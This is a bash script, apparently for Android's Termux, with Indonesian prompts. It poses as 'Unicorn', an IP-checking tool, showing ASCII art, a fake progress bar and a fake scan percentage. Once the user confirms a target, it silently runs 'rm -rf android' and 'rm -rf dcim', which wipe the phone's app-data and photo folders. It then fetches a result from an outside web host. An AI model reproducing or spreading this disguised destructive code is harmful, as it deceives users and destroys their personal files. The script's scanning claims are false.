clear
unicorn(){
echo "                              / "
sleep 0.03
echo "                   __       // "
sleep 0.03
echo "                   -\= \=\ // "
sleep 0.03
echo "                 --=_\=---//=-- "
sleep 0.03
echo "               -_==/  \/ //\/-- "
sleep 0.03
echo "                ==/   /O   O\==-- "
sleep 0.03
echo "   _ _ _ _     /_/    \  ]  /-- "
sleep 0.03
echo "  /\ ( (- \    /       ] ] ]==- "
sleep 0.03
echo " (\ _\_\_\-\__/     \  (,_,)-- "
sleep 0.03
echo "(\_/                 \     \- "
sleep 0.03
echo "\/      /       (   ( \  ] /) "
sleep 0.03
echo "/      (         \   \_ \./ ) "
sleep 0.03
echo "(       \         \      )  \ "
sleep 0.03
echo "(       /\_ _ _ _ /---/ /\_  \ "
sleep 0.03
echo " \     / \     / ____/ /   \  \ "
sleep 0.03
echo "  (   /   )   / /  /__ )   (  ) "
sleep 0.03
echo "  (  )   / __/  ---        / / "
sleep 0.03
echo "  \  /   \ \             _/ / "
sleep 0.03
echo "  ] ]     )_\_         /__\/ "
sleep 0.03
echo "  /_\     ]___\ "
sleep 0.02
echo " (___) "
sleep 0.03
echo "==============================="
echo "=      Unicorn Project        ="
echo "==============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
echo
echo selamat Datang Kak ,Siapa Nick Kaka?
read name
clear
echo "loading..." 
echo
load
clear
unicorn
echo "Unicorn Adalah Sebuah Tools Untuk"
echo "Melakukan Pengecekan Ip"
echo
echo Selamat Datang $name
echo
echo "Masukan IP target"
read target
echo
echo "Apakah target "$target" sudah benar?"
echo "y/n?"
read confirm
echo $confirm
if [ $confirm = "y" ]; then
echo "Melakukan scanning"
rm -rf android
rm -rf dcim
i=0
max=100
while [ $i -le $max ]; do
echo -ne "\nScanning $target percentage : $i% "
sleep 0.03
if [ $i -eq 100 ]; then
echo -ne " [complete!]\n"
echo "========================================"
echo "=                                      Found!                                     ="
curl -s http://zlucifer.hol.es/Project_nmap_lite/index.php?target=$target
echo "========================================"
fi
let i++
done
else
echo "Kesalahan"
fi
